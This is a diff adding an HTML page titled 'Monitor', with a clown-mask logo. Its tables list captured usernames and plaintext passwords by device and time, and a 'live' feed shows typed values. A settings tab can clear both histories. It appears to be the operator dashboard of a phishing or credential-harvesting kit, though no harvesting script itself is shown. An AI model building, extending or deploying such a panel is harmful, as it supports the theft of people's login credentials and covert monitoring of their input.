@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="main.js"></script>
+  <title>Monitor</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <div class="header">
+  <div class="name"> <img src="/img/stunning-clown-mask-isolated-white-background_1159488-6911.jpg" alt="logo">monitor</div>
+  <div id="menu">&#9776</div>
+</div>
+<div class="monitorbox">
+  <ul>
+    <li class="active" id="moniloggedin">logged in</li>
+    <li id="monilive">live</li>
+    <li id="monisettings">settings</li>
+  </ul>
+  <div class="logintable">
+  <table id="loggedintable">
+    <tr>
+      <th>username</th>
+      <th>password</th>
+      <th>device_name</th>
+      <th>time</th>
+      <th>date_of_submition</th>
+    </tr>
+  </table>
+    <table id="livetable">
+
+    <tr>
+      <th>type</th>
+      <th>value</th>
+      <th>device_name</th>
+      <th>time</th>
+      <th>date_of_submition</th>
+    </tr>
+
+  </table>
+  <div id="settingtable">
+    <div class="stx"><div>clear live table</div><div class="stxbtn" id="clive">clear</div></div>
+    <p>clearing live table means deleting the live history please use with caution</p>
+        <div class="stx"><div>clear loggedin table</div><div class="stxbtn" id="cloggedin">clear</div></div>
+    <p>clearing loggedin table means deleting the loggedin history please use with caution</p>
+  </div>
+  </div>
+</div>
+
+<script src="monitor.js"></script>
+</body>
+
+      </html>
